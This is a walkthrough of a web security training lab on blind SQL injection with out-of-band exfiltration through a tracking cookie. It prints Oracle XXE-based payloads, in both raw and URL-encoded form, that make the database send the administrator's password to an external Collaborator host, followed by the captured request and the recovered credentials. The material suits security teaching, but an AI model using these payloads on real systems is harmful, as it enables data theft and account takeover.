## Blind SQL injection with out-of-band data exfiltration

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The SQL query is executed asynchronously and has no effect on the application's response. However, you can trigger out-of-band interactions with an external domain.

The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.

To solve the lab, log in as the administrator user.

Note :

To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's default public server.

## Notes

- `/login`
- `/filter?category=parameter`
- Vulnerable cookie: `TrackingId`

## Resume

1. Confirm the blind OOB SQL injection
2. Trigger an external DNS/HTTP interaction
3. Inject a payload that exfiltrates the administrator password
4. Capture the password in Burp Collaborator
5. Log in as `administrator`

## Solve

Use the following payload to confirm that the application can trigger external interactions:

```sql
' UNION SELECT EXTRACTVALUE(
xmltype('<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://uywbfrmdcjxn3g2ctfkeezkopfv6j07p.oastify.com/">
%remote;]>'),
'/l') FROM dual--
```

HTTP request:

```http
Cookie: TrackingId='+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//uywbfrmdcjxn3g2ctfkeezkopfv6j07p.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--;
```

If Burp Collaborator receives a DNS or HTTP interaction, the vulnerability is confirmed.

Use the following payload to exfiltrate the administrator password through the Collaborator domain:

```sql
' UNION SELECT EXTRACTVALUE(
xmltype('<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username = 'administrator')||'.t82apqwcmi7mdfcb3eudoyunze55t0hp.oastify.com/">
%remote;]>'),
'/l') FROM dual--
```

HTTP request:

```http
Cookie: TrackingId='+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username+%3d+'administrator')||'.t82apqwcmi7mdfcb3eudoyunze55t0hp.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--;
```

Burp Collaborator received the following HTTP request:

```http
GET / HTTP/1.0
Host: 2i7l96ri8p8c0la3psw6.t82apqwcmi7mdfcb3eudoyunze55t0hp.oastify.com
Content-Type: text/plain; charset=utf-8
```

The subdomain contains the administrator password:

```text
2i7l96ri8p8c0la3psw6
```



Credentials :

```text
administrator:2i7l96ri8p8c0la3psw6
```